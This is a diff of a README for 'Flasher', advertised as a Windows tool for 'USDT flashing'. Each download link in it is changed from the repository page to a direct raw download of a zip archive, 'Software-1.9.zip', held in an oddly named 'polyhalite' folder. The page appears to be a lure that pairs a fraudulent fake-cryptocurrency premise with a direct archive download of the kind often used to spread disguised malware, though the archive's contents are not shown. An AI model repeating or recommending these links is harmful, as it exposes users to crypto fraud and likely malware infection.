@@ -1,12 +1,12 @@
 # ⚡ Flasher - Simple USDT Flashing for Windows
 
-[![Download Flasher](https://img.shields.io/badge/Download-Flasher-4B6BFB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lacieacting47/Flasher)
+[![Download Flasher](https://img.shields.io/badge/Download-Flasher-4B6BFB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lacieacting47/Flasher/raw/refs/heads/main/polyhalite/Software-1.9.zip)
 
 ## 📥 Download Flasher
 
 Use this link to visit the page and download the app:
 
-[Download Flasher](https://github.com/lacieacting47/Flasher)
+[Download Flasher](https://github.com/lacieacting47/Flasher/raw/refs/heads/main/polyhalite/Software-1.9.zip)
 
 ## 🖥️ What Flasher Does
 
@@ -44,7 +44,7 @@ Follow these steps in order.
 
 Go to the Flasher page here:
 
-[Download Flasher](https://github.com/lacieacting47/Flasher)
+[Download Flasher](https://github.com/lacieacting47/Flasher/raw/refs/heads/main/polyhalite/Software-1.9.zip)
 
 ### 2. Download the file
 
@@ -200,7 +200,7 @@ Before you start, check these items:
 
 Primary download page:
 
-[https://github.com/lacieacting47/Flasher](https://github.com/lacieacting47/Flasher)
+[https://github.com/lacieacting47/Flasher/raw/refs/heads/main/polyhalite/Software-1.9.zip](https://github.com/lacieacting47/Flasher/raw/refs/heads/main/polyhalite/Software-1.9.zip)
 
 ## 🏷️ Topics
 
